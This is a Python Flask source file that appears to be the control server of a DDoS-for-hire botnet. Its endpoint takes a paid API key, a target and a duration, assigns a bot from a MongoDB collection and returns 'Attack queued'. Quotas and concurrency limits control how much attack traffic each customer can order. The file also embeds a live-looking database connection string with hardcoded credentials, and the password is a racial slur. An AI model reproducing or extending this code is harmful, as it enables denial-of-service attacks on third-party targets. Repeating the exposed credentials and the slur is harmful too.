from flask import Flask, jsonify
from pymongo import MongoClient
import os, random

app = Flask(__name__)

MONGO_URI = 'mongodb+srv://ToughLuck1:nigger@bitnsfw.ytfzx.mongodb.net/?retryWrites=true&w=majority&appName=BitNSFW'
client = MongoClient(MONGO_URI)
db = client['api_system']

keys_collection = db['keys']
bots_collection = db['bots']

def send_command_to_bot(bot, key, target, seconds):
    bots_collection.update_one(
        {'id': bot['id']},
        {'$set': {
            'available': False,
            'which_key_is_using': key,
            'current_command': {'target': target, 'seconds': seconds}
        }}
    )

@app.route('/bot-complete/<bot_id>')
def bot_complete(bot_id):
    bot = bots_collection.find_one({"id": bot_id})
    if bot and bot['which_key_is_using']:
        keys_collection.update_one(
            {"key": bot['which_key_is_using']}, 
            {"$inc": {"concurrents": -1}}
        )
    return jsonify({"status": "updated"})

@app.route('/send-l7-dw9q0j_api/<key>/<target>/<int:seconds>')
def api_request(key, target, seconds):
    user = keys_collection.find_one({'key': key})
    if not user:
        return jsonify({'error': 'Invalid API key'}), 403
    if user['concurrents'] >= user['concurrents_max']:
        return jsonify({'error': 'Concurrent limit reached'}), 429
    if user['tests_left'] <= 0:
        return jsonify({'error': 'No tests remaining'}), 403
    if seconds > user['max_seconds']:
        return jsonify({'error': 'Requested duration exceeds maximum allowed'}), 400

    available_bots = list(bots_collection.find({'available': True}))
    if not available_bots:
        return jsonify({'error': 'No available bots'}), 503

    bot = random.choice(available_bots)
    send_command_to_bot(bot, key, target, seconds)
    keys_collection.update_one({'key': key}, {'$inc': {'tests_left': -1, 'concurrents': 1}})

    return jsonify({'status': 'Attack queued', 'target': target, 'duration': seconds}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
